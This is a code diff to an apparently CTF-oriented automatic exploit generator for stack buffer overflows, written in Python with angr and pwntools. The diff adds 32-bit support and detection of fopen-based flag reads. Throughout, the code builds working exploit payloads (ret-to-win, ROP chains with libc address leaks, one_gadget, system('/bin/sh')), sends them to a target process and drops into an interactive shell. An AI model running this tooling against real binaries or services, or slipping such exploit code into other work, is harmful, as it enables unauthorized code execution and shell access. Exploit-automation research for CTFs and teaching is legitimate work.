@@ -5,7 +5,8 @@ from functools import wraps
 import angr
 from angr.storage.memory_mixins.address_concretization_mixin import MultiwriteAnnotation
 
-from .my_utils import init_r2, killmyself, set_concrete, check_r2_one
+from .my_utils import (init_r2, killmyself, set_concrete, check_r2_one, pack,
+                       unpack, get_di_register, get_sp_register)
 
 
 class angr_gets(angr.SimProcedure):
@@ -87,13 +88,26 @@ class Bof_Aeg(object):
         state.libc.max_gets_size = 0x200 # define gets() size; If the overflow is too long, it will affect the envp of the system.
 
         self.entry_state = state.copy()
+        self.setup_arch_args()
+        
+        
+    def setup_arch_args(self):
+        if pwn.context.arch == 'amd64':
+            self.word_size = 8
+            self.reg_prefix = 'r'
+        elif pwn.context.arch == 'i386':
+            self.word_size = 4
+            self.reg_prefix = 'e'
+        else:
+            raise NotImplementedError(f"This tool is not yet supported the architecture {pwn.context.arch}")
+        
 
     def int_overflow(self, value, offset, prefix=b''):
         if isinstance(prefix, bytes):
             payload = prefix
         elif isinstance(prefix, str):
             payload = prefix.encode()
-        payload += b'\0'*(offset-8-len(prefix)) + pwn.p64(value)
+        payload += b'\0'*(offset-8-len(prefix)) + pack(value)
         self.p.sendline(payload)
         self.p.interactive()
 
@@ -109,10 +123,10 @@ class Bof_Aeg(object):
         if simgr.found == []:
             pwn.log.error("Cannot find stack bof.")
 
-    def find_win(self):
+    def find_win(self): # fix bugs
         """
         Looking for backdoors:
-        1. system("/bin/sh") or system("cat flag")
+        1. system("/bin/sh") or system("cat flag") or fopen("cat flag")
         2. print flag to stdout
         """
         pwn.log.info("Finding win...")
@@ -133,35 +147,38 @@ class Bof_Aeg(object):
                     simgr.explore(find=pre.addr+pre.size-5)
 
                     st = simgr.found[0]
-                    arg = st.memory.load(st.regs.rdi,8)
+                    arg = st.memory.load(get_di_register(st), self.word_size) 
                     if arg.uninitialized:
                         break
-                    cmd = st.solver.eval(st.memory.load(st.regs.rdi,8),cast_to=bytes)
-                    cmd13 = st.solver.eval(st.memory.load(st.regs.rdi,13),cast_to=bytes)
+                    cmd = st.solver.eval(st.memory.load(get_di_register(st), self.word_size),cast_to=bytes)
+                    cmd13 = st.solver.eval(st.memory.load(get_di_register(st),13),cast_to=bytes)
                     if cmd in (b'/bin/sh\x00',b'cat flag') or cmd13 == b'/bin/cat flag':
                         self.win_addr = pre.addr
                         pwn.log.info("Found system(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
                         
                     
         if 'fopen' in self.elf.plt:
-            system_node = self.cfg.model.get_any_node(self.elf.plt['fopen'])
-            if system_node:
-                for pre in system_node.predecessors:
+            fopen_node = self.cfg.model.get_any_node(self.elf.plt['fopen'])
+            if fopen_node:
+                for pre in fopen_node.predecessors:
                     # node may be included
-                    if pre.addr <= system_node.addr and pre.addr + pre.size < system_node.addr:
+                    if pre.addr <= fopen_node.addr and pre.addr + pre.size < fopen_node.addr:
                         continue
                     state = self.project.factory.blank_state(
                     addr = pre.addr,
                     mode = 'fastpath') # we don't want to do any solving
                     simgr = self.project.factory.simgr(state)
-                    simgr.explore(find=pre.addr+pre.size-5)
-
+                    simgr.explore(find=pre.addr+pre.size-5) # find addres of fopen
+                    
                     st = simgr.found[0]
-                    arg = st.memory.load(st.regs.rdi,8)
+                    # print(st.regs.eip)
+                    
+                    # Find address of string "flag", "flag.txt"
+                    arg = st.memory.load(get_di_register(st), self.word_size) 
                     if arg.uninitialized:
                         break
-                    cmd = st.solver.eval(st.memory.load(st.regs.rdi,8),cast_to=bytes)
-                    cmd13 = st.solver.eval(st.memory.load(st.regs.rdi,13),cast_to=bytes)
+                    cmd = st.solver.eval(st.memory.load(get_di_register(st), self.word_size),cast_to=bytes)
+                    cmd13 = st.solver.eval(st.memory.load(get_di_register(st),13),cast_to=bytes)
                     # print(cmd, cmd13)
 
                     if cmd in (b'flag.txt',b'flag', b'/flag.txt', b'/flag'):
@@ -187,7 +204,7 @@ class Bof_Aeg(object):
                 addr_dcu = hex(\
                     first_block.addr+first_block.size-first_block.capstone.insns[-1].size)
                 r2.cmd('dcu '+addr_dcu)
-                r2.cmd('dr rip='+hex(tmp.block_addr)) # set register value
+                r2.cmd(f'dr {self.reg_prefix}ip='+hex(tmp.block_addr)) # set register value
                 r2.cmd('dc') # continue process execution
                 with open(self.outputpath,'rb') as f:
                     print(f.read())
@@ -245,7 +262,7 @@ class Bof_Aeg(object):
                 recv_type = 'str'
             else:
                 aid = data.rindex(b'\x55'*3)
-                leak = pwn.u64(data[aid-5:aid+1].ljust(8,b'\x00'))
+                leak = unpack(data[aid-5:aid+1].ljust(8,b'\x00'))
                 recv_str = data[:aid-5]
                 recv_type = 'byte'
             debug_test_base = 0
@@ -273,7 +290,7 @@ class Bof_Aeg(object):
         if recv_type == 'str':
             leak = int(self.p.recv(14),16)
         elif recv_type == 'byte':
-            leak = pwn.u64(self.p.recv(6).ljust(8,b'\x00'))
+            leak = unpack(self.p.recv(6).ljust(8,b'\x00'))
 
         if self.has_text_leak:
             pwn.log.info("Found remote text leak :0x%x"%leak)
@@ -326,14 +343,20 @@ class Bof_Aeg(object):
         
         return False
     
-    def ret_to_win(self):
+    def ret_to_win(self, offset=0):
         """Modify the return address to win
         """
+        if offset:
+            payload = b'a'*offset + pack(self.win_addr)
+            print(payload)
+            self.p.sendline(payload)
+            self.p.interactive()
+            return
         pwn.log.info("Trying tech{ret_to_win}...")
 
         win_addr = self.win_addr if not self.elf.pie else self.win_addr-self.elf.address+self.text_base
-        state = self.vuln_state.copy()
-        set_concrete(state, self.vuln_control_addrs, pwn.p64(win_addr))
+        state: angr.SimState = self.vuln_state.copy()
+        set_concrete(state, self.vuln_control_addrs, pack(win_addr))
         payload = b''.join(state.posix.stdin.concretize())
         
         # system has movaps(check rsp & 0xf == 0)
@@ -371,14 +394,14 @@ class Bof_Aeg(object):
                 if self.leak_recv_type == 'str':
                     leak = int(self.p.recv(14),16)
                 elif self.leak_recv_type == 'byte':
-                    leak = pwn.u64(self.p.recv(6).ljust(8,b'\x00'))
+                    leak = unpack(self.p.recv(6).ljust(8,b'\x00'))
                 pwn.log.info("Found remote text leak :0x%x"%leak)
                 self.text_base = leak - self.text_offset
                 pwn.log.info("text_base :0x%x"%self.text_base)
 
             rop = self.get_rop()
             state = self.vuln_state.copy()
-            set_concrete(state, self.vuln_control_addrs, pwn.p64(rop.search(regs=['rdi']).address+1)+pwn.p64(win_addr))
+            set_concrete(state, self.vuln_control_addrs, pack(rop.search(regs=['rdi']).address+1)+pack(win_addr))
             payload = b''.join(state.posix.stdin.concretize())
             self.p.sendline(payload)
             try:
@@ -401,7 +424,7 @@ class Bof_Aeg(object):
         pwn.log.info("Found one_offset :0x%x"%one_offset)
 
         state = self.vuln_state.copy()
-        set_concrete(state, self.vuln_control_addrs, pwn.p64(self.libc_base+one_offset)[:6])
+        set_concrete(state, self.vuln_control_addrs, pack(self.libc_base+one_offset)[:6])
         getshell = b''.join(state.posix.stdin.concretize())
         self.p.sendline(getshell)
         print(getshell.hex())
@@ -458,9 +481,9 @@ class Bof_Aeg(object):
         vuln_func_addr = self.vuln_func.address if not self.elf.pie else self.vuln_func.address-self.elf.address+self.text_base
         
         payload = b''
-        payload += pwn.p64(rop.rdi.address+1) # movaps align
+        payload += pack(rop.rdi.address+1) # movaps align
         payload += rop.chain()
-        payload += pwn.p64(vuln_func_addr)
+        payload += pack(vuln_func_addr)
 
         state = self.vuln_state.copy()
         set_concrete(state, self.vuln_control_addrs, payload)
@@ -468,7 +491,7 @@ class Bof_Aeg(object):
 
         self.p.send(rop_chain)
 
-        leak_addr = pwn.u64(self.p.recvuntil(b'\x7f',drop=False)[-6:].ljust(8,b'\x00'))
+        leak_addr = unpack(self.p.recvuntil(b'\x7f',drop=False)[-6:].ljust(8,b'\x00'))
         pwn.log.info("leak_addr: 0x%x"%leak_addr)
 
         libc = pwn.ELF(self.libpath+'libc.so.6',checksec=False)
@@ -485,7 +508,7 @@ class Bof_Aeg(object):
         rop.call(system_addr, [binsh_addr])
 
         payload = b''
-        #payload += pwn.p64(rop.rdi.address+1) # movaps align
+        #payload += pack(rop.rdi.address+1) # movaps align
         payload += rop.chain()
 
         state = self.vuln_state.copy()
@@ -550,7 +573,7 @@ def overflow_detect_filter(bof_aeg: Bof_Aeg, elf: pwn.ELF):
     """Detect whether there is a stack overflow vulnerability
     """
     
-    def overflow_detect_filter(simgr):
+    def overflow_detect_filter(simgr: angr.SimulationManager=None):
         for state in simgr.unconstrained:
             if state.regs.pc.symbolic:
                 pwn.log.info("Found vulnerable state.")
@@ -578,7 +601,7 @@ def overflow_detect_filter(bof_aeg: Bof_Aeg, elf: pwn.ELF):
 
                 if state.regs.pc.symbolic:
                     # Get the controllable symbol symbol address after rbp+8(pc)
-                    rbp = state.solver.eval(state.regs.rsp - 0x10)
+                    rbp = state.solver.eval(get_sp_register(state) - 0x10)
                     tmp = list(state.memory.addrs_for_name(variables[0]))
                     tmp.sort()
                     for i in range(len(tmp)):
